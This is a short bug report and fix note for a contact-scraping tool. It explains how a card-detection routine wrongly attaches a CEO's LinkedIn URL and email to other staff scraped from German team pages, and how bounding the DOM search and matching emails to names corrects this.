**Failure.** Crawl a German team page whose first card is the CEO with a LinkedIn link. Every HR and engineering lead exported from that company carries the CEO's LinkedIn URL in `person_linkedin`. On a family firm (Hans Müller CEO, Petra Müller HR) Petra's row ships `h.mueller@firma.de` with `email_status='published'` — a confidently wrong, evidenced-looking contact that bounces or reaches the wrong person.

**Fix.** Stop climbing a fixed number of levels. Climb upward only while the ancestor contains exactly one element from `_NAME_TAGS` whose text passes `_looks_like_a_person`, and stop at the last such ancestor. Additionally, before accepting a mailto/LinkedIn from the card, require that it be no further than the next sibling name heading in document order, and for email require `_email_belongs_to(email, name)` (or at least that the card contains no other name heading) before attaching it.
